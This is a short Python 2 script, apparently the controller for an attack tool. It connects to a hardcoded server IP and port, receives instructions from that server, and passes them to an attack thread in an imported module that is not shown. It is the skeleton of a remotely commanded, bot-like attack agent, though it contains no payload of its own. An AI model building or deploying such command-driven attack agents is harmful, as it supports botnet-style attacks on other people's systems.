# Attack master/manager

import threading, time, Queue  # Python
import Xtcpconnector
import Xattacker     # Own classes


# Statics
SERVER_IP = "145.100.102.108"
SERVER_PORT = 55555

class Agent():
    def __init__(self, Q):
        self.bla = "bla"
        self.in_Q = Q

    def slave(self):
        while True:
            try:
                self.MSG = self.in_Q.get(True, 0.05)
                if self.MSG is None:
                    continue
            except Queue.Empty:
                pass

if __name__ == '__main__':
    ALL_THREADS = []
    attack_q = Queue.Queue(maxsize=1)
    instruction_q = Queue.Queue(maxsize=1)

    print "1.Starting TCP connector"
    LISTENER = Xtcpconnector.TCPclient(attack_q, SERVER_IP, SERVER_PORT)
    ALL_THREADS.append(LISTENER)
    LISTENER.daemon = True
    LISTENER.start()
    #LISTENER.join()
    print "  TCP connector started"

    print "2. Starting attack agent"
    attack_slave = Xattacker.Attacker(instruction_q)
    ALL_THREADS.append(attack_slave)
    attack_slave.daemon = True
    attack_slave.start()
    print "  Attack agent started\n"

    while 1:
        try:
            data = attack_q.get(True, 0.05)
            try:
                instruction_q.put((data))
            except Queue.Full:
                bogus = instruction_q.get(False)
                instruction_q.put((data))

        except Queue.Empty:
            pass


    #time.sleep(50)
    print "Done"



